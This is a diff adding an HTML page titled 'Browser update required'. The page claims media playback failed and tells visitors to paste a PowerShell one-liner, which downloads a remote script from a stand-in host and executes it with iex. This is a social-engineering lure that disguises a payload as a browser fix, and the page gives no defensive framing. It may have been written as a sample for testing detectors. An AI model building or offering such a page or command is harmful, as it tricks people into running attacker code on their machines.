@@ -1,0 +1,23 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Browser update required</title>
+    <style>
+      body { font-family: Arial, sans-serif; margin: 40px; max-width: 820px; }
+      pre { background: #101418; color: #f3f4f6; padding: 16px; border-radius: 12px; }
+      .toolbar { display: flex; gap: 12px; }
+      button { padding: 10px 14px; }
+    </style>
+  </head>
+  <body>
+    <h1>Browser update required</h1>
+    <p>Your media playback failed. Open PowerShell and run the fix below to re-enable access.</p>
+    <div class="toolbar">
+      <button>Copy</button>
+      <button>Continue</button>
+    </div>
+    <pre>powershell -nop -c "iwr https://bad.test/fix.ps1 -UseBasicParsing | iex"</pre>
+  </body>
+</html>
